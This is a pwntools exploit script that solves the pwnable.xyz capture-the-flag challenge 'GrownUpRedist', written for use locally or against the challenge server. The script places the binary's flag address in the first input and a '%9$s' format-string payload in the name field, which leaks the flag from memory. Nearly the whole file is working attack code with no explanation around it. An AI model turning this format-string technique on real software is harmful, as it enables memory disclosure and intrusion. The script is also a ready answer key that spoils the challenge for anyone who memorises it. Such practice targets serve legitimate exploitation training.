from pwn import *

exe = ELF("./GrownUpRedist", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30004

gdbscript = """
set follow-fork-mode child
"""

args.LOCAL = True
# args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def main():
    r  = conn()

    r.sendafter(b"y/N]: ", b"y" * 8 + p64(exe.symbols.flag))    
    r.sendafter(b"Name: ", (b"a" * 32 + b"%9$s").ljust(0x80, b"a"))
    
    r.interactive()

if __name__ == "__main__":
    main()
